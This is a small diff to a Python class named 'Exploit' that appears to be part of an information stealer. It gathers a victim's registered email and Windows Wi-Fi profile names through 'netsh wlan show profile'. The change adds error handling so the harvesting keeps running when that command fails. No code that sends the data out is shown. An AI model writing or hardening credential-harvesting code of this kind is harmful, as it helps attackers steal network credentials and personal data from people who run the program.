@@ -100,7 +100,11 @@ class Exploit:
         except Exception:
             registeredMail = "N/A"
 
-        WlanProfileNameCollector = subprocess.check_output('netsh wlan show profile', creationflags=flag, encoding='latin-1')
+        try:
+            WlanProfileNameCollector = subprocess.check_output('netsh wlan show profile', creationflags=flag, encoding='latin-1')
+        except subprocess.CalledProcessError:
+            WlanProfileNameCollector = "nothing, makes no sense though"
+            
         WlanProfileNameList = []
 
         for line in WlanProfileNameCollector.splitlines():
